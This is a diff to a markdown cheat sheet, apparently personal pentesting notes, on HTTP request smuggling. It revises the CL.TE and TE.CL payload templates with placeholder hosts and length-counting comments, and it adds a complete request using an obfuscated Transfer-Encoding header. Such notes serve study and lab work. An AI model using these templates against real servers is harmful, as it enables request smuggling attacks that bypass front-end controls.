@@ -22,13 +22,13 @@ Front end uses `Content-Length` and back end uses `Transfer-Encoding`
 
 ```
 POST / HTTP/1.1
-Host: vulnerable-website.com
-Content-Length: 13
+Host: <website>
+Content-Length: 13    #count from line 5 included to the delimiter
 Transfer-Encoding: chunked
 
 0
 
-SMUGGLED
+STRING HERE
 ```
 
 #### TE.CL Exploit
@@ -37,12 +37,12 @@ Front end uses `Transfer-Encoding` and back end uses `Content-Length`
 
 ```
 POST / HTTP/1.1
-Host: vulnerable-website.com
-Content-Length: 3
+Host: <website>
+Content-Length: 3    #length from line 5 to 6 included
 Transfer-Encoding: chunked
 
-8    #String length in HEX
-SMUGGLED 
+b                    #length in HEX of the lines between the first and second terminators
+STRING HERE
 0
 [\r\n\r\n]
 ```
@@ -61,6 +61,21 @@ Transfer-Encoding:[\t]chunked
 X: X[\n]Transfer-Encoding: chunked
 Transfer-Encoding
 : chunked
+```
+
+Complete request
+
+```
+POST / HTTP/1.1
+Host: <website>
+Content-Length: 3    #length from line 5 to 7 excluded
+Transfer-Encoding: chunked
+<obfuscated transfer encoding header>
+
+b                    #length in HEX of the lines between the first and second terminators
+STRING HERE
+0
+[\r\n\r\n]
 ```
 
 ### Reflected XSS
